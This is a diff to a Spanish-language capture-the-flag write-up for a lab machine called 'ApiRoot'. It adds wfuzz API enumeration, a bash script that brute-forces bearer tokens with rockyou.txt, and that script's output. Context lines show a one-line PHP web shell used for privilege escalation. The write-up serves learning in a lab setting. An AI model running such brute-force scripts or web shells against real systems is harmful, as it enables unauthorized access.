@@ -124,6 +124,8 @@ La página principal nos proporciona los ejemplos de uso de la API, la direcció
 ~/ApiRoot ᐅ wfuzz -c --hc=404 -z file,/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u "http://172.17.0.2:5000/api/FUZZ"
 ```
 
+**Salida:**
+
 ```python
 =====================================================================
 ID           Response   Lines    Word       Chars       Payload                                                                                                                      
@@ -133,16 +135,81 @@ ID           Response   Lines    Word       Chars       Payload
 ```
 **Explicación de parámetros:**
 
-- `dir`: Modo de enumeración de directorios.
-- `-w`: Especifica la wordlist a utilizar.
-- `-u`: URL objetivo a escanear.
-- `-t 200`: Define el número de hilos a usar (200 en este caso).
-- `--no-error`: Oculta los errores emitidos por Gobuster.
+- `-c`: Salida con color.
+- `--hc`: Oculta en código de estado (404 en este caso).
+- `-z`: Payload a utilizar acomañado de la wordlist.
+- `-u`: Objetivo del ataque.
 
----
+Suponiendo que `/users` es el directorio oculto, podemos utilizar el comando proporcionado en la guía de la API. Y como podemos ver, se puede acceder, pero sin autorización.
+```python
+~/ApiRoot ᐅ curl -H "Authorization: Bearer password_secreta" http://172.17.0.2:5000/api/users
+```
+
+**Salida:**
+
+```python
+{
+  "error": "No autorizado"
+}
+```
+
+---  
 
 ## Fuerza bruta 
 
+Ahora que sabemos cual es el directorio oculto y un posible usuario, intentaremos hacer fuerza bruta con el comando `cURL` apoyandonos de un script de `bash`. El cual monstrará un mesnsaje exitoso si la contraseña es correcta. 
+```bash
+#!/bin/bash
+
+URL="http://172.17.0.2:5000/api/users"
+WORDLIST="/usr/share/seclists/Passwords/rockyou.txt"
+
+while read -r token; do
+    echo "Trying token: $token"
+    
+    response=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $token" "$URL")
+    
+    if [ "$response" -eq 200 ]; then
+        echo "Success! Valid token found: $token"
+        exit 0
+    fi
+done < "$WORDLIST"
+
+echo "No valid token found."
+exit 1
+```
+Si se ejecuta el script, se obtiene el siguiente resultado, en el que vemos las credenciales del usuario Bearer.
+```python
+Trying token: 123456
+Trying token: 12345
+Trying token: 123456789
+Trying token: password
+Trying token: iloveyou
+Trying token: princess
+Trying token: 1234567
+Trying token: rockyou
+Trying token: 12345678
+Trying token: abc123
+Trying token: nicole
+Trying token: daniel
+Trying token: babygirl
+Trying token: monkey
+Trying token: lovely
+Trying token: jessica
+Trying token: 654321
+Trying token: michael
+Trying token: ashley
+Trying token: qwerty
+Trying token: 111111
+Trying token: iloveu
+Trying token: 000000
+Trying token: michelle
+Trying token: tigger
+Trying token: sunshine
+Trying token: chocolate
+Trying token: password1
+Success! Valid token found: password1
+```
 
 ## Escalada de privilegios.
 
@@ -155,6 +222,7 @@ El archivo que se subirá tendrá el nombre: reverse.php
 <?php
         system($_GET['rev']);
 ?>
+
 ```
 
 - `<?php ... ?> ` :  Esto indica el inicio y el fin de un bloque de código.
